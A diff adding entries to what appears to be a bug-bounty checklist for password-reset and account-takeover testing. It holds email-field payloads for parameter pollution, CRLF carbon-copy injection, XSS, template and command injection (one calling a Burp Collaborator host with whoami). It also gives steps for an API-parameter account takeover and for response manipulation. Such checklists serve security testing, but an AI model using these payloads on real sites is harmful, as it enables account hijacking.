@@ -7,9 +7,11 @@
     ```
         JSON: {"email":["victim@gmail.com","attacker@gmail.com"]} 
         {"email":"victim@gmail.com","email":"attacker@gmail.com"}
+        {"email":"victim@mail.com","hacker@mail.com"}
 
         Double parameter: email=victim@gmail.com&email=attacker@gmail.com
         email[]=victim@gmail.com&email[]=attacker@gmail.com
+        email=victim@mail.com%00hacker@mail.com
 
         carbon copy: email=victim@xyz.tld%0a%0dcc:hacker@xyz.tld
                      email="victim@mail.tld%0a%0dbcc:attacker@mail.tld"
@@ -81,6 +83,7 @@
     - Try XSS, SSTI, Command Injection etc in the email field.
     ```
         hello+(<script>alert(1)</script>)@gmail.com
+        "<svg/onload=alert(1)>"@gmail.com
         "<%= 7 * 7 %>"@gmail.com
         hello+(${{7*7}})@gmail.com
         hello@`whoami`.xyz.burpcollaborator.net
@@ -99,6 +102,14 @@
     - 2FA auto disabled after password reset.
    
     - Changing Email And Password of any User through API Parameters [https://ad3sh.medium.com/full-account-takeover-changing-email-and-password-of-any-user-through-api-parameters-3d527ab27240]
+        - Full Account Takeover via Changing Email And Password of any User through API Parameters
+Exploitation
+            1. Attacker have to login with their account and Go to the Change password function
+            2. Start the Burp Suite and Intercept the request
+            3. After intercepting the request sent it to repeater and modify parameters Email and Password
+            POST /api/changepass
+            [...]
+            ("form": {"email":"victim@email.tld","password":"12345678"})
 
     - Reset password link sent over unsecured http protocol [https://hackerone.com/reports/1888915]
 
@@ -113,6 +124,16 @@
     - weak cryptography issue [https://infosecwriteups.com/bugbounty-how-i-was-able-to-compromise-any-user-account-via-reset-password-functionality-a11bb5f863b3]
 
     - Response Manipulation: Replace Bad Response With Good One [https://medium.com/@innocenthacker/how-i-found-the-most-critical-bug-in-live-bug-bounty-event-7a88b3aa97b3]
+        Response manipulation: Replace Bad Response With Good One
+        ```
+        Look for Request and Response like these
+        HTTP/1.1 401 Unauthorized
+        (“message”:”unsuccessful”,”statusCode:403,”errorDescription”:”Unsuccessful”)
+
+        Change Response
+        HTTP/1.1 200 OK
+        (“message”:”success”,”statusCode:200,”errorDescription”:”Success”)
+        ```
 
     - Failure to Invalid Session after Password Change [https://hackerone.com/reports/514577] [https://hackerone.com/reports/678050]
 
